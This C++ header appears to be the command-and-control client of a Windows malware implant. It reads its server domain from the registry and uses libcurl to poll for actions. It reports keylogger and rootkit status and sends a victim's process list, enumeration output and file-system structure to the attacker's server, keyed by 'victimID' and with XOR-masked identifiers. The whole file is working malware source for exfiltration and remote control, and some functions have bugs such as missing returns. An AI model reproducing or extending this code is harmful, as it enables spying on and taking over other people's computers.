#pragma once
#include <Windows.h>
#include <iostream>
#include <curl/curl.h>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <string>
#include <codecvt>
#include "IPC.h"
#include "resource.h"


using namespace std;

class httpRequest {
public:

    IPC ipc = IPC();
    wstring SERVER_BASE_URL_FINAL = ipc.readDomainFromRegistry();

    static std::wstring StringToWideString(const std::string& str) {
        int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.length()), nullptr, 0);
        std::wstring wstrTo(size_needed, 0);
        MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.length()), &wstrTo[0], size_needed);
        return wstrTo;
    }

    static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
        size_t total_size = size * nmemb;
        output->append(static_cast<char*>(contents), total_size);
        return total_size;
    }

    static string createTimeStamp() {
        auto now = std::chrono::system_clock::now();
        auto now_time = std::chrono::system_clock::to_time_t(now);
        std::stringstream ss;
        ss << std::put_time(std::localtime(&now_time), "%Y-%m-%dT%H:%M:%S");
        return ss.str();
    }

    static unsigned int S12hash(const std::string& str) {
        unsigned int sum = 0;
        for (char ch : str) {
            sum += static_cast<unsigned int>(ch);
        }
        sum = sum * 83 + 12;
        return sum;
    }

    static unsigned long long createS12Hash(const std::string& str) {
        unsigned int h1 = S12hash(str);
        unsigned int h2 = S12hash(std::string(str.rbegin(), str.rend()));
        unsigned int h3 = h2 / 12;

        std::string hashValue = std::to_string(h1) + std::to_string(h2) + std::to_string(h3);

        unsigned long long finalHashValue = std::stoull(hashValue) * (83 + 12);
        return finalHashValue;
    }


    static std::string createSignature(const std::string& url) {
        std::string method = "POST";
        std::string timeStamp = createTimeStamp();
        std::string signature = method + url + timeStamp;

        unsigned long long hashValue = createS12Hash(signature);
        std::string hashValueStr = std::to_string(hashValue);
		std::string finalHashValue = std::to_string(hashValue);
		return finalHashValue;
    }
	
    string httpNewAction(string id) {
        string XappTimestamp = createTimeStamp();
        string XAppSignature = createSignature("/Action");
        
        // XAppSignature
        CURL* curl;
        CURLcode res;
        curl_global_init(CURL_GLOBAL_DEFAULT);
        curl = curl_easy_init();
        //id = XOR(id, "S12Secret");
        wstring url = SERVER_BASE_URL_FINAL + L"/Action";
        string urlStr(url.begin(), url.end());

        if (curl) {

            // send to SERVER_BASE_URL_FINAL + L"/Action"
            curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
            curl_easy_setopt(curl, CURLOPT_POST, 1L);

            struct curl_slist* headers = NULL;
            headers = curl_slist_append(headers, "Content-Type: application/json");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

            headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
            headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

            const char* id_cstr = id.c_str();
            char post_data[256]; 
            snprintf(post_data, sizeof(post_data), "{\"id\": \"%s\"}", id);

            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
            string response_data;
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
            res = curl_easy_perform(curl);
            curl_global_cleanup();
            curl_easy_cleanup(curl);
            return response_data;
        }  
     }

    bool itsKeyloggerActive(string id) {
        // petition to Action/LoggerStatus
        // if the response is "true" then the keylogger returns true
        // if the response is "false" then the keylogger returns false
        httpRequest http = httpRequest();
        string XappTimestamp = http.createTimeStamp();
        string XAppSignature = http.createSignature("/Action/LoggerStatus");

        CURL* curl;
        CURLcode res;
        curl_global_init(CURL_GLOBAL_DEFAULT);
        curl = curl_easy_init();
        wstring url = SERVER_BASE_URL_FINAL + L"/Action/LoggerStatus";
        string urlStr(url.begin(), url.end());

        if (curl) {
			curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
			curl_easy_setopt(curl, CURLOPT_POST, 1L);

			struct curl_slist* headers = NULL;
			headers = curl_slist_append(headers, "Content-Type: application/json");
			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

			headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
			headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

			const char* id_cstr = id.c_str();
			char post_data[256];
			snprintf(post_data, sizeof(post_data), "{\"id\":\"%s\"}", id_cstr);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
			string response_data;
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http.WriteCallback);
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
			res = curl_easy_perform(curl);
			curl_global_cleanup();
			curl_easy_cleanup(curl);

			if (response_data == "true") {
				return true;
			}
			else {
				return false;
			}
		}




		
    }

        string httpGetParamsAction(string victimID, string actionID) {
            httpRequest http = httpRequest();
            string XappTimestamp = http.createTimeStamp();
            string XAppSignature = http.createSignature("/Action/DoAction");

            wstring url = SERVER_BASE_URL_FINAL + L"/Action/DoAction";
            string urlStr(url.begin(), url.end());

            // XAppSignature
            CURL* curl;
            CURLcode res;
            curl_global_init(CURL_GLOBAL_DEFAULT);
            curl = curl_easy_init();

            if (actionID != "10") {
                actionID = XOR(actionID, "S12Secret");
            }
            else {
				actionID = "10Special";
            }           


            if (curl) {
                curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
                curl_easy_setopt(curl, CURLOPT_POST, 1L);

                struct curl_slist* headers = NULL;
                headers = curl_slist_append(headers, "Content-Type: application/json");
                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
                curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

                headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
                headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

                const char* id_cstr = victimID.c_str();
                const char* action_cstr = actionID.c_str();

                char post_data[256];
                snprintf(post_data, sizeof(post_data), "{\"id\":\"%s\",\"actionID\":\"%s\"}", id_cstr, action_cstr);

                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
                string response_data;
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http.WriteCallback);
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
                res = curl_easy_perform(curl);
                curl_global_cleanup();
                curl_easy_cleanup(curl);
                return response_data;
            }
        }

        bool rootkitInitialitzated(string id) {
			httpRequest http = httpRequest();
			string XappTimestamp = http.createTimeStamp();
			string XAppSignature = http.createSignature("/Action/ActiveRootkit");

			CURL* curl;
			CURLcode res;
			curl_global_init(CURL_GLOBAL_DEFAULT);
			curl = curl_easy_init();
			wstring url = SERVER_BASE_URL_FINAL + L"/Action/ActiveRootkit";
			string urlStr(url.begin(), url.end());

            if (curl) {
                curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
                curl_easy_setopt(curl, CURLOPT_POST, 1L);

                struct curl_slist* headers = NULL;
                headers = curl_slist_append(headers, "Content-Type: application/json");
                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
                curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

                headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
                headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

                const char* id_cstr = id.c_str();
                char post_data[256];
                snprintf(post_data, sizeof(post_data), "{\"id\":\"%s\"}", id_cstr);

                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
                // no response data
                res = curl_easy_perform(curl);
                curl_global_cleanup();
                curl_easy_cleanup(curl);
                return true;
            }
		}


        string httpSendProcesses(string id, string processes) {
            httpRequest http = httpRequest();
            string XappTimestamp = http.createTimeStamp();
            string XAppSignature = http.createSignature("/Process");

            CURL* curl;
            CURLcode res;
            curl_global_init(CURL_GLOBAL_DEFAULT);
            curl = curl_easy_init();
            wstring url = SERVER_BASE_URL_FINAL + L"/Process";
            string urlStr(url.begin(), url.end());

            if (curl) {
				curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
				curl_easy_setopt(curl, CURLOPT_POST, 1L);

				struct curl_slist* headers = NULL;
				headers = curl_slist_append(headers, "Content-Type: application/json");
				curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
				curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

				headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
				headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
				curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

                string post_data = "{\"id\":\"" + id + "\", \"processes\":\"" + processes + "\"}";
				curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());

				string response_data;
				curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
				curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
				res = curl_easy_perform(curl);

				if (res != CURLE_OK) {
					fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
				}

				long http_response_code;
				curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_response_code);
				std::cout << "HTTP Response Code: " << http_response_code << std::endl;

				curl_global_cleanup();
				curl_easy_cleanup(curl);

				return response_data;
			}
        }

        string sendEnumeration(string victimID, string result) {
			httpRequest http = httpRequest();
			string XappTimestamp = http.createTimeStamp();
			string XAppSignature = http.createSignature("/Enumeration");

			CURL* curl;
			CURLcode res;
			curl_global_init(CURL_GLOBAL_DEFAULT);
			curl = curl_easy_init();
			wstring url = SERVER_BASE_URL_FINAL + L"/Action/OutputEnumerate";
			string urlStr(url.begin(), url.end());

			if (curl) {
				curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
				curl_easy_setopt(curl, CURLOPT_POST, 1L);

				struct curl_slist* headers = NULL;
				headers = curl_slist_append(headers, "Content-Type: application/json");
				curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
				curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

				headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
				headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
				curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

				string post_data = "{\"id\":\"" + victimID + "\", \"result\":\"" + result + "\"}";
				curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());

				string response_data;
				curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
				curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
				res = curl_easy_perform(curl);

				if (res != CURLE_OK) {
					fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
				}

				long http_response_code;
				curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_response_code);
				std::cout << "HTTP Response Code: " << http_response_code << std::endl;

				curl_global_cleanup();
				curl_easy_cleanup(curl);

				return response_data;
			}
        }

        string httpGetParams(string victimID, string actionID) {
            httpRequest http = httpRequest();
            string XappTimestamp = http.createTimeStamp();
            string XAppSignature = http.createSignature("/Action/SecretOperation");

            // XAppSignature
            CURL* curl;
            CURLcode res;
            curl_global_init(CURL_GLOBAL_DEFAULT);
            curl = curl_easy_init();

            if (actionID != "10") {
                actionID = secretOperation(actionID);
            }
            else {
                actionID = "10Special";
            }

            victimID = secretOperation(victimID);
            wstring url = SERVER_BASE_URL_FINAL + L"/Action/SecretOperation";
            string urlStr(url.begin(), url.end());


            if (curl) {
                curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
                curl_easy_setopt(curl, CURLOPT_POST, 1L);

                struct curl_slist* headers = NULL;
                headers = curl_slist_append(headers, "Content-Type: application/json");
                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
                curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

                headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
                headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

                const char* id_cstr = victimID.c_str();
                const char* action_cstr = actionID.c_str();

                char post_data[256];
                snprintf(post_data, sizeof(post_data), "{\"id\":\"%s\",\"actionID\":\"%s\"}", id_cstr, action_cstr);

                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
                string response_data;
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http.WriteCallback);
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
                res = curl_easy_perform(curl);
                curl_global_cleanup();
                curl_easy_cleanup(curl);
                return response_data;
            }
        }

        string httpSendFileSystemStructure(string victimID, string actionID, string& fileSystemStructure) {
            httpRequest http = httpRequest();
            string XappTimestamp = http.createTimeStamp();
            string XAppSignature = http.createSignature("/File/FileSystem");

            CURL* curl;
            CURLcode res;
            curl_global_init(CURL_GLOBAL_DEFAULT);
            curl = curl_easy_init();
            wstring url = SERVER_BASE_URL_FINAL + L"/File/FileSystem";
            string urlStr(url.begin(), url.end());

            if (curl) {                
                curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
                curl_easy_setopt(curl, CURLOPT_POST, 1L);

                struct curl_slist* headers = NULL;
                headers = curl_slist_append(headers, "Content-Type: application/json");
                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
                curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

                headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
                headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);


                string post_data = "{\"victimID\":\"" + victimID + "\", \"actionID\":\"" + actionID + "\", \"fileSystemStructure\":\"" + fileSystemStructure + "\"}";
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());

                string response_data;
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
                res = curl_easy_perform(curl);

                if (res != CURLE_OK) {
                    fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                }

                long http_response_code;
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_response_code);
                std::cout << "HTTP Response Code: " << http_response_code << std::endl;

                curl_global_cleanup();
                curl_easy_cleanup(curl);

                return response_data;
            }
        }


	
private:
    static string XOR(string data, string key) {
		string output = data;
		for (int i = 0; i < data.size(); i++) {
			output[i] = data[i] ^ key[i % key.size()];
		}
		return output;
	}

    //static std::wstring StringToWideString(const std::string& str) {
    //    int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.length()), nullptr, 0);
    //    std::wstring wstrTo(size_needed, 0);
    //    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.length()), &wstrTo[0], size_needed);
    //    return wstrTo;
    //}

    static string secretOperation(string data) {
        int dataInt = stoi(data);
		return to_string(dataInt * 12);
	}

    

    
};
